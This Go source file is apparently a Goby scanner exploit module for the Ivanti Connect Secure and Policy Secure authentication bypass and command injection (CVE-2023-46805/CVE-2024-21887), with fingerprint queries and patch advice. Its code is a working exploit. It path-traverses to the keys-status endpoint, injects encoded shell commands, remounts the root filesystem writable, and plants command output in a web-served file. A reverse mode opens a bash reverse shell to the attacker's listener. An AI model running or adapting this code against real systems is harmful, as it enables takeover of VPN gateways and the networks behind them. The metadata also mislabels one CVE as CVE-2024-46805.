package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Ivanti Connect Secure and Policy Secure keys-status remote command execution vulnerability (CVE-2023-46805/CVE-2024-21887)",
    "Description": "<p>Ivanti is a software and information technology services company focused on providing solutions for IT management, security, service management and endpoint management. Ivanti Connect Secure and Ivanti Policy Secure are part of two security solutions from Ivanti for network security and connectivity management.</p><p>There is a command injection vulnerability in the web component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x). The authentication bypass vulnerability and the command injection vulnerability can be used to send specially crafted requests and Execute arbitrary commands on the device.</p>",
    "Product": "Ivanti Connect Secure",
    "Homepage": "https://www.ivanti.com.cn/products/connect-secure-vpn",
    "DisclosureDate": "2024-01-17",
    "PostTime": "2024-01-18",
    "Author": "zou",
    "FofaQuery": "header=\"DSBrowserID\" || banner=\"DSBrowserID\" || body=\"/dana-na/;expires=\" || body=\"dana-cached/imgs/space.gif\" || body=\"/dana-na/imgs/space.gif\" || body=\"/dana-na/imgs/Product_favicon.png\" || body=\"/dana-na/imgs/Ivanti_favicon.png\" || body=\"/dana-na/css/ds.js\" || body=\"ds_mobile_safari.css\" || body=\"welcome.cgi?p=logo&signinId=url_default\"",
    "GobyQuery": "header=\"DSBrowserID\" || banner=\"DSBrowserID\" || body=\"/dana-na/;expires=\" || body=\"dana-cached/imgs/space.gif\" || body=\"/dana-na/imgs/space.gif\" || body=\"/dana-na/imgs/Product_favicon.png\" || body=\"/dana-na/imgs/Ivanti_favicon.png\" || body=\"/dana-na/css/ds.js\" || body=\"ds_mobile_safari.css\" || body=\"welcome.cgi?p=logo&signinId=url_default\"",
    "Level": "3",
    "Impact": "<p>which utilizes authentication to bypass the vulnerability and in combination with command injection vulnerabilities, can send customized requests and execute arbitrary commands on the device, gain server privileges, and thus control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-46805",
        "CVE-2024-21887"
    ],
    "CNNVD": [],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "Ivanti Connect Secure 和 Policy Secure keys-status 远程命令执行漏洞（CVE-2023-46805/CVE-2024-21887）",
            "Product": "Ivanti Connect Secure",
            "Description": "<p>Ivanti 是一家软件和信息技术服务公司，专注于提供用于 IT 管理、安全、服务管理和终端管理等方面的解决方案。Ivanti Connect Secure 和 Ivanti Policy Secure 是 Ivanti 公司提供的两个安全性解决方案的组成部分，主要用于网络安全和连接性管理。</p><p>Ivanti Connect Secure（9.x、22.x）和 Ivanti Policy Secure（9.x、22.x）的 Web 组件中存在一个命令注入漏洞，利用身份验证绕过漏洞配合命令注入漏洞能够发送特制请求并在设备上执行任意命令。</p>",
            "Recommendation": "<p>1、厂商已发布补丁和修复方案，请及时更新：<a href=\"https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>利用身份验证绕过漏洞配合命令注入漏洞能够发送特制请求并在设备上执行任意命令，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ivanti Connect Secure and Policy Secure keys-status remote command execution vulnerability (CVE-2023-46805/CVE-2024-21887)",
            "Product": "Ivanti Connect Secure",
            "Description": "<p>Ivanti is a software and information technology services company focused on providing solutions for IT management, security, service management and endpoint management. Ivanti Connect Secure and Ivanti Policy Secure are part of two security solutions from Ivanti for network security and connectivity management.</p><p>There is a command injection vulnerability in the web component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x). The authentication bypass vulnerability and the command injection vulnerability can be used to send specially crafted requests and Execute arbitrary commands on the device.</p>",
            "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>which utilizes authentication to bypass the vulnerability and in combination with command injection vulnerabilities, can send customized requests and execute arbitrary commands on the device, gain server privileges, and thus control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10906"
}`

	urlEncode2der345tr := func(input string) string {
		var encodedString string
		for _, char := range input {
			encodedString += "%" + strconv.FormatInt(int64(char), 16)
		}
		return encodedString
	}

	sendPayloadRequesr3rewr43576yh := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig("/api/v1/totp/user-backup-code/../../license/keys-status/" + urlEncode2der345tr(";"+payload))
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 30
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	commandEchoing4vgfdg55 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		resp, err := sendPayloadRequesr3rewr43576yh(hostInfo, "mount -o remount,rw  /dev/root /; rm -f \"/home/webserver/htdocs/dana-na/imgs/index.txt\"; "+cmd+" > \"/home/webserver/htdocs/dana-na/imgs/index.txt\" 2>&1")
		if err != nil {
			return nil, err
		} else if resp.StatusCode == 404 || resp.StatusCode == 403 {
			return nil, errors.New("漏洞利用失败")
		}
		requestConfig := httpclient.NewGetRequestConfig("/dana-na/imgs/index.txt")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			resp, _ := commandEchoing4vgfdg55(hostInfo, "echo "+checkStr)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			waitSessionCh := make(chan string)
			if attackType == "reverse" {
				reversePort, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil || len(reversePort) == 0 {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				sendPayloadRequesr3rewr43576yh(expResult.HostInfo, godclient.ReverseTCPByBash(reversePort)+" &")
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Output = err.Error()
						return expResult
					}
				case <-time.After(time.Second * 45):
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "cmd" {
				if resp, err := commandEchoing4vgfdg55(expResult.HostInfo, goutils.B2S(stepLogs.Params["cmd"])); resp != nil && resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
